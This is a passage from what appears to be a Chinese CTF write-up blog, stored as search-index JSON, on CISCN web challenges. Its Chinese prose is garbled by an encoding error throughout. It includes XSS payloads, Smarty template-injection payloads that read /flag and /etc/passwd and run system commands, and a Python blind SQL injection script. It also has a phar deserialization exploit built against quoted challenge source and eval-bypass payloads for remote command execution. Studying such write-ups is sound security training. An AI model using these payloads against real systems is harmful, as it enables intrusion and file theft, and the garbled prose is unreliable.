ï¼Œç„¶åæ‰‹åŠ¨æ‰§è¡Œå˜›ï¼Œæ„é€ payload ?arg01=version&amp;arg02=&lt;a href=\"javascript:alert()\"&gt;here&lt;/a&gt; level-20 &lt;?php ini_set(\"display_errors\", 0); echo '&lt;embed src=\"xsf04.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;'; ?&gt; åŒä¸Šä¸€å…³ä¸€æ ·æœ‰åŒå¼•å·ï¼Œè¿˜æ˜¯è¦flashæ’å…¥jsä»£ç  ?arg01=id&amp;arg02=xss\\\"))}catch(e){alert(1)}// 0x04 å‚è€ƒæ–‡ç«  å…³äºfloor()æŠ¥é”™æ³¨å…¥ï¼Œä½ çœŸçš„æ‡‚äº†å—ï¼Ÿ åŸºç¡€æ±‡æ€»-sqlilab-Less-1-20 XSS ä»é›¶å¼€å§‹ æ–‡ä»¶ä¸Šä¼ ç»•è¿‡å§¿åŠ¿æ•´ç† æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ€è·¯æ€»ç»“","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"CISCNå›½èµ›","path":"/2024/01/24/ctf-shua-ti-zhi-lu/","content":"[CISCN 2019åä¸œå—]Web11 é¦–é¡µå±•ç¤ºäº†è¯¥å…¬å…±åœ°å€APIçš„ä¸€äº›åŠŸèƒ½ï¼Œè¿™é‡Œå®¹æ˜“æƒ³åˆ°å¯èƒ½ä¸ºSSTIæ³¨å…¥ï¼ŒæŠ“åŒ…ç„¶åæ·»åŠ xffå¤´ï¼Œè¿›è¡Œsstiæµ‹è¯• ç¡®å®šä¸ºsstiäº†ï¼ŒåŒæ—¶é¦–é¡µæç¤ºæˆ‘ä»¬è¿™æ˜¯smartyæ¡†æ¶ï¼Œå¹¶ä¸”åç«¯è¯­è¨€ä¹Ÿæ˜¯PHPã€‚ç›´æ¥ä¸Špayloadå³å¯ è¿™é‡Œçœ‹äº†wpå‘ç°è¿˜æœ‰å¾ˆå¤šå§¿åŠ¿ï¼Œåšä¸ªè®°å½• {$smarty.version} //smartyçš„ç‰ˆæœ¬å· #å¯ä»¥ä½¿ç”¨{php}{/php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ {php}phpinfo();{/php} #æ³¨ï¼šSmartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚ #{literal}å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚ è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚ {literal}alert('xss');{/literal} //xssæ”»å‡» ---é€‚ç”¨äºPHP5 #å®ƒç›¸æ¯”è¾ƒäº{php}{/php}ä¸åŒçš„æ˜¯æ·»åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰é…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ç”¨{else}å’Œ{else if},æ‰€æœ‰çš„phpæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œæ¯”å¦‚||,or,and,&amp;ç­‰ {if phpinfo()}{/if} {if readfile ('/flag')}{/if} {if system('ls /')}{/if} {if show_source('/flag')}{/if} é™æ€æ–¹æ³•åˆ©ç”¨ é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™ â€”â€”æ—§ç‰ˆæœ¬ Smartyç±»æœ‰getStreamVariableæ–¹æ³•å¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶è¿”å›å…¶å†…å®¹ {self::getStreamVariable(â€œfile:///etc/passwdâ€)} åˆ©ç”¨ Smarty_Internal_Write_File ç±»çš„writeFileæ–¹æ³•æ¥å†™shell [CISCN 2019ååŒ—Day2]Web1 æ˜ç¡®å‘Šè¯‰æˆ‘ä»¬æ˜¯SQLæ³¨å…¥ï¼Œæ¥ä¸‹æ¥å…ˆfuzzä¸€ä¸‹è¿‡æ»¤å­—ç¬¦ å¯ä»¥çœ‹åˆ°490çš„éƒ½æ˜¯è¢«è¿‡æ»¤çš„ï¼Œå¾ˆå¤šï¼Œå…³é”®çš„æœ‰selectï¼Œâ€“+ï¼Œ//*ï¼Œ/**/ï¼Œinformationï¼Œlengthï¼Œandç­‰ï¼Œæœ‰æ„æ€çš„æ˜¯è¿™é¢˜ä¼¼ä¹è¿˜æœ‰ç»„åˆè¿‡æ»¤çš„æƒ…å†µ å¹¶ä¸”é¡µé¢åªä¼šå›æ˜¾ï¼Œfalseä¸trueå¯¹åº”çš„é¡µé¢ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½sqlç›²æ³¨ã€‚ æ ¹æ®é¢˜ç›®æç¤ºçš„flagä½äºflagè¡¨ã€flagåˆ—ä¸‹ï¼Œé‚£ä¼°è®¡å°±æ˜¯äºŒåˆ†æ³•çˆ†ç ´flagå­—ç¬¦äº†ï¼Œæ¥ä¸‹æ¥è‚¯å®šå°±æ˜¯æƒ³å¦‚ä½•æ„é€ åˆé€‚çš„payloadæ¥è¿è¡Œpyè„šæœ¬ã€‚ è¿™é‡Œä¹Ÿæ˜¯é™·å…¥è¯¯åŒºï¼Œçœ‹äº†wpæ‰æ˜ç™½å¿˜è®°åˆ¤æ–­é—­åˆæ–¹å¼äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•æ•°å­¦è¿ç®— å¯ä»¥çœ‹åˆ°å¼‚æˆ–è¿ç®—çš„ç»“æœä¸åŒï¼Œè¯´æ˜ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œé‚£æˆ‘ä»¬å€Ÿç€å¼‚æˆ–æ–¹å¼æ¥æ„é€ payload import time import requests url = 'http://node4.anna.nssctf.cn:28470/index.php' flag = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = f\"0^(ascii(substr((select(flag)from(flag)),{i},1))&gt;{mid})\" data= {\"id\":payload} #start_time = time.time() response = requests.post(url = url, data = data).text #end_time = time.time() #use_time = end_time - start_time if \"Hello\" in response: left = mid + 1 else: right = mid mid = (left + right) // 2 #print(mid) flag += chr(mid) print(\"flag:\", flag) ç”±äºé¡µé¢æœ‰æ•°æ®å›æ˜¾ï¼Œå› æ­¤è¿™é‡Œæ²¡å¿…è¦ç”¨ifæ¥åˆ¤æ–­ [CISCN 2019ååŒ—Day1]Web1 è¿›å…¥é¦–é¡µå‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæ‰«ç½‘ç«™æ— æœåï¼Œå°è¯•æ³¨å†Œç”¨æˆ·ï¼Œæ¥ç€çœ‹åˆ°æœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œä¸è¿‡é™åˆ¶äº†ä¸Šä¼ é©¬ï¼Œé‚£æˆ‘ä»¬æ­£å¸¸ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ç±»å‹ï¼Œå‘ç°å‡ºç°ä¸‹è½½å’Œåˆ é™¤ä¸¤ä¸ªåŠŸèƒ½ã€‚é‚£å¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸¤ä¸ªåŠŸèƒ½è‚¯å®šå­˜åœ¨æ¼æ´ï¼Œæ ¹æ®æ¼æ´åˆ©ç”¨æ¥çœ‹ï¼Œæˆ‘ä»¬å…ˆæ‰¾ä¸‹è½½åŠŸèƒ½çš„æ¼æ´ã€‚ç‚¹å‡»æŠ“åŒ…å¦‚å›¾æ‰€ç¤º å¯ä»¥çœ‹åˆ°èƒ½å®ç°ä»»æ„æ–‡ä»¶çš„è¯»å– index.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;title&gt;ç½‘ç›˜ç®¡ç†&lt;/title&gt; &lt;head&gt; &lt;link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;link href=\"static/css/panel.css\" rel=\"stylesheet\"&gt; &lt;script src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"static/js/bootstrap.bundle.min.js\"&gt;&lt;/script&gt; &lt;script src=\"static/js/toast.js\"&gt;&lt;/script&gt; &lt;script src=\"static/js/panel.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav aria-label=\"breadcrumb\"&gt; &lt;ol class=\"breadcrumb\"&gt; &lt;li class=\"breadcrumb-item active\"&gt;ç®¡ç†é¢æ¿&lt;/li&gt; &lt;li class=\"breadcrumb-item active\"&gt;&lt;label for=\"fileInput\" class=\"fileLabel\"&gt;ä¸Šä¼ æ–‡ä»¶&lt;/label&gt;&lt;/li&gt; &lt;li class=\"active ml-auto\"&gt;&lt;a href=\"#\"&gt;ä½ å¥½ &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt; &lt;/nav&gt; &lt;input type=\"file\" id=\"fileInput\" class=\"hidden\"&gt; &lt;div class=\"top\" id=\"toast-container\"&gt;&lt;/div&gt; &lt;?php include \"class.php\"; $a = new FileList($_SESSION['sandbox']); $a-&gt;Name(); $a-&gt;Size(); ?&gt; class.php &lt;?php error_reporting(0); $dbaddr = \"127.0.0.1\"; $dbuser = \"root\"; $dbpass = \"root\"; $dbname = \"dropbox\"; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; } } class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); } } ?&gt; download.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, \"flag\") === false) { Header(\"Content-type: application/octet-stream\"); Header(\"Content-Disposition: attachment; filename=\" . basename($filename)); echo $file-&gt;close(); } else { echo \"File not exist\"; } ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response); } else { Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response); } ?&gt; æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨æ•æ„Ÿå‡½æ•°ï¼šfile_get_contents($this-&gt;filename);ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥è®©filenameä¸ºflagæ–‡ä»¶ï¼Œé‚£å°±å¾—åˆ°flagäº†ã€‚ æ¥ä¸‹æ¥å°±æ€è€ƒå¦‚ä½•æ§åˆ¶filenameå˜é‡ï¼Œæˆ‘ä»¬å…ˆå®šä½å…¶æ‰€åœ¨å‡½æ•° å¯ä»¥çœ‹åˆ°å…¶ä½äºFileç±»çš„closeå‡½æ•°ï¼Œæ¥ä¸‹æ¥çœ‹è°è°ƒç”¨è¿‡è¯¥å‡½æ•° æˆ‘ä»¬å¯ä»¥åœ¨Userç±»ä¸­çš„ææ„å‡½æ•°å‘ç°dbè°ƒç”¨äº†closeå‡½æ•°ï¼Œä½†å¦‚æœæˆ‘ä»¬ç›´æ¥åˆ©ç”¨è¿™ä¸ªé“¾å­æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ã€‚é‚£æˆ‘ä»¬åªå¥½æ¥ç€æ‰¾å¯»å…¶ä»–å›æ˜¾æ•°æ®çš„åœ°æ–¹äº†ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°FileListç±»ä¸­çš„ææ„å‡½æ•°ä¼šå›æ˜¾å¯¹åº”çš„$funcå’Œ$filenameå†…å®¹ï¼Œé‚£è¿™é‡Œè‚¯å®šå°±æ˜¯æœ€ç»ˆè·å–flagçš„åœ°æ–¹äº†ï¼Œ æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥å†çœ‹ä¸€ä¸‹callé­”æœ¯æ–¹æ³•ï¼šå½“è®¿é—®ä¸€ä¸ªç±»ä¸­ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è°ƒç”¨ è¿™é‡Œä¼šå°†å‡½æ•°åå¼•å…¥funcså˜é‡ä¸­ï¼Œä¹‹åforeachå¾ªç¯ï¼Œå¯¹æ¯ä¸€ä¸ªfileå˜é‡å¯¹åº”çš„æ–‡ä»¶æ‰§è¡Œfuncä¹Ÿå°±æ˜¯closeæ–¹æ³•ï¼Œä¹‹åå°†å¾—åˆ°çš„ç»“æœå­˜å…¥resultsæ•°ç»„ä¸­ã€‚ é‚£é“¾å­åŸºæœ¬æ˜æ˜¾äº†ï¼Œå°±æ˜¯User.destruct-ã€‹FileList.call-ã€‹File.destructã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾é‚£é‡Œå¯ä»¥è§¦å‘äº† å¯ä»¥çœ‹åˆ°è™½ç„¶download.phpæ–‡ä»¶å¯ä»¥è°ƒç”¨closeï¼Œä½†æ˜¯è¿‡æ»¤äº†flagå…³é”®å­—ã€‚ è€Œdelete.phpå°±æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬è‚¯å®šè¦ä»è¿™é‡Œå…¥æ‰‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ pharæ–‡ä»¶å†…å®¹äº†ï¼ˆé…åˆfile_get_contentså®ç°ååºåˆ—åŒ–ï¼‰ç‚¹å‡»åˆ é™¤ä¹‹åè°ƒç”¨deteleå‡½æ•°ï¼Œæ¥ç€åˆè°ƒç”¨unlikå‡½æ•°å®ç°pharååºåˆ—åŒ– &lt;?php class User { public $db; public function __construct() { $this-&gt;db = new FileList(); } } class File { public $filename; } class FileList { private $files; public function __construct() { $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); } } $phar = new Phar(\"exp.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //è®¾ç½®stub $a = new User(); $phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; æ¥ç€å°†ç”Ÿæˆçš„1.pharæ–‡ä»¶åç¼€æ”¹ä¸ºjpgä¸Šä¼ ï¼Œä¹‹åç‚¹å‡»åˆ é™¤æŠ“åŒ…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºå¾—åˆ°flag [CISCN 2019åˆèµ›]Love Math &lt;?php error_reporting(0); //å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //ä¾‹å­ c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(\"å¤ªé•¿äº†ä¸ä¼šç®—\"); } $blacklist = [' ', '\\t', '\\r', ' ','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\"); } } //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\"); } } //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval('echo '.$content.';'); } è¿™é¢˜ä»£ç é€»è¾‘ç®€å•ï¼Œå°±æ˜¯ä¼ å‚è¿›å»çš„å†…å®¹é•¿åº¦ä¸è¶…è¿‡80ï¼Œå¹¶ä¸”å…¶ä¸­çš„å†…å®¹è¿˜è¦ç¬¦åˆç™½åå•ï¼Œè¿™é‡Œçš„æ­£åˆ™çš„ä½œç”¨å°±æ˜¯æå–contentå˜é‡ä¸­çš„å‡½æ•°åã€‚æœ€ç»ˆç›®çš„æ˜¯è¦RCE è¿™é‡Œåˆ·é¢˜å°‘ï¼Œæ²¡çŸ¥è¯†ç‚¹ï¼Œç›´æ¥çœ‹wpå­¦äº†ï¼š åŠ¨æ€å‡½æ•° phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•° ä¾‹å¦‚ï¼š$function = \"sayHello\";$function();-ã€‹æ‰§è¡ŒsayHelloå‡½æ•° phpä¸­å‡½æ•°åé»˜è®¤ä¸ºå­—ç¬¦ä¸² ä¾‹å¦‚æœ¬é¢˜ç™½åå•ä¸­çš„asinhå’Œpiå¯ä»¥ç›´æ¥å¼‚æˆ–ï¼Œè¿™å°±å¢åŠ äº†æ„é€ å­—ç¬¦çš„é€‰æ‹© æ–¹æ³•å¾ˆå¤šï¼Œä¸€ä¸ªä¸ªå­¦å§ï¼Œå…¶ä¸­æœ€å…³é”®çš„å‡½æ•°å°±æ˜¯base_convertï¼Œè€Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„å°±æ˜¯æ‹¼æ¥å‡½æ•°+æ‹¼æ¥å˜é‡çš„æ€è·¯æ¥æ„é€ payload base_convert ( string $number , int $frombase , int $tobase ) : string è¿”å›ä¸€å­—ç¬¦ä¸²ï¼ŒåŒ…å« number ä»¥ tobase è¿›åˆ¶çš„è¡¨ç¤ºã€‚number æœ¬èº«çš„è¿›åˆ¶ç”± frombase æŒ‡å®šã€‚frombase å’Œ tobase éƒ½åªèƒ½åœ¨ 2 å’Œ 36 ä¹‹é—´ï¼ˆåŒ…æ‹¬ 2 å’Œ 36ï¼‰ã€‚é«˜äºåè¿›åˆ¶çš„æ•°å­—ç”¨å­—æ¯ a-z è¡¨ç¤ºï¼Œä¾‹å¦‚ a è¡¨ç¤º 10ï¼Œb è¡¨ç¤º 11 ä»¥åŠ z è¡¨ç¤º 35ã€‚æ„æ€å°±æ˜¯å°†è¾“å…¥æ•°å­—çš„è¿›åˆ¶è¿›è¡Œè½¬æ¢ã€‚ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°å°†å…¶ä»–è¿›åˆ¶æ•°è½¬ä¸º36è¿›åˆ¶ï¼Œè€Œä¸”36è¿›åˆ¶æ˜¯åŒ…å«æ‰€æœ‰æ•°å­—å’Œå°å†™å­—æ¯çš„ã€‚ä½†ç»ˆç©¶æ— æ³•æ„é€ GETå¤§å†™å­—æ¯ã€‚ä½†åˆå¯ä»¥æ„é€ å…¶ä»–çš„å°å†™å­—æ¯å‡½æ•°ï¼Œè®©æ„é€ çš„å‡½æ•°è½¬æ¢ã€‚ hexdec ( string $hex_string ) : number //åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ dechex ( int $number ) : string //åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ bin2hex ( string $str ) : string //å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼ hex2bin ( string $data ) : string //è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼ŒæŠŠ_GETå…ˆåˆ©ç”¨bin2hex()è½¬æ¢ä¸º åå…­è¿›åˆ¶ï¼Œåœ¨åˆ©ç”¨hexdec()è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œé‚£ä¹ˆåè¿‡æ¥å°±å¯ä»¥æŠŠä¸€æ®µæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ã€‚ ä½†æ˜¯binhex()ï¼Œ hexdec()ç­‰ä¸æ˜¯ç™½åå•çš„å‡½æ•°ï¼Œè¦ä»å“ªé‡Œæ¥ï¼Ÿ è¿™æ—¶å€™å°±è¦çœ‹base_convert()çš„ä½œç”¨äº†ï¼Œå› ä¸ºä¸Šé¢çš„å‡½æ•°éƒ½æ˜¯å°å†™çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ­¤å‡½æ•°å°†ä¸€ä¸ªåè¿›åˆ¶æ•°çš„æ•°å­—è½¬ä¸ºä¸‰åå…­è¿›åˆ¶çš„å°å†™å­—ç¬¦ã€‚è¿™é‡Œä¸‰åå…­è¿›åˆ¶æ˜¯10ä¸ªæ•°å­—+26ä¸ªå°å†™å­—æ¯ï¼Œå› æ­¤èƒ½å¤Ÿå®Œæ•´è¡¨ç¤ºå‡ºä¸€ä¸ªå‡½æ•°åçš„æ‰€æœ‰å­—ç¬¦ã€‚ é‚£ä¹ˆæ€ä¹ˆæ‰èƒ½ç›´åˆ°è¿™ä¸ªæ•°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å…ˆé€†å‘å°†ä¸‰åå…­è¿›åˆ¶å­—ç¬¦è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ï¼Œå¾—åˆ°è¯¥æ•°å­—ï¼Œæœ€ç»ˆé€†å‘æ„é€ å³å¯ã€‚ æ–¹æ³•ä¸€ï¼š æ¥ä¸‹æ¥å°±æ˜¯æ„é€ hex2binä¸_GETå­—ç¬¦ä¸²äº†ï¼Œæ¡†æ¶å¦‚ä¸‹ï¼š ?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag//åé¢ä¸¤ä¸ªæ˜¯ä¼ å‚,é¢˜ç›®æŠŠä¸œè¥¿éƒ½è¿‡æ»¤çš„å·®ä¸å¤šäº†ï¼Œåªæœ‰æ•°å­—ï¼Œä¸å¯èƒ½æœ‰å­—æ¯ï¼Œæ‰€ä»¥ç”¨$_GETä¼ å‚ç±»ä¼¼äºä¸Šæ–‡çš„$a=catã€‚ä½†æ˜¯è¿™é‡ŒæŠŠ[]è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨{}ä»£æ›¿ æ„é€ å¦‚ä¸‹ï¼š base_convert('hex2bin',36,10); //37907361743 base_convert(37907361743,10,36); //hex2bin bin2hex('_GET'); //å¾—åˆ° 5f474554 å°†å­—ç¬¦è½¬æ¢ä¸ºåå…­è¿›åˆ¶ hexdec('5f474554'); //å¾—åˆ° 1598506324 å°†åå…­è¿›åˆ¶è½¬ä¸ºåè¿›åˆ¶ dechex(1598506324); //å¾—åˆ° 5f474554 å°†åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ hex2bin('5f474554'); //å¾—åˆ° _GET æ¥ä¸‹æ¥ç¼–å†™payload ?c=$pi=bin_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos})&amp;abs=system&amp;cos=ls //è¿›ä¸€æ­¥cat flagå³å¯ æ–¹æ³•äºŒï¼š å¯ä»¥æ„é€ getallheaders()ä¼ å‚ï¼Œæ­¤æ˜¯å°å†™çš„ï¼Œå¯ä»¥ç›´æ¥ç”¨base_convertè½¬æ¢ã€‚ getallheaders ( void ) : array è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯ã€‚é¦–å…ˆæ„é€ systemå’Œgetallheadersï¼š base_convert('getallheaders',30,10); //å¾—åˆ°8768397090111664438ï¼Œè¿™é‡Œä¸ä½¿ç”¨36è¿›åˆ¶æ˜¯å› ä¸ºç²¾åº¦ä¼šä¸¢å¤±ï¼Œå°è¯•åˆ°30çš„æ—¶å€™æˆåŠŸ base_convert('system',36,10); //å¾—åˆ°1751504350 payloadå¦‚ä¸‹ï¼š ?c=$pi=base_convert;$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1}) HEADER: 1:cat /flag //system(getallheaders()[1]) å®é™…ä¸Šå°±æ˜¯æ‰¾åˆ°é”®å€¼ä¸º1å¯¹åº”çš„value æ–¹æ³•ä¸‰ï¼š execï¼š hexdec(bin2hex('cat f*')); //å¾—åˆ°109270211257898 base_convert('exec',36,10); //å¾—åˆ°696468 payloadï¼š 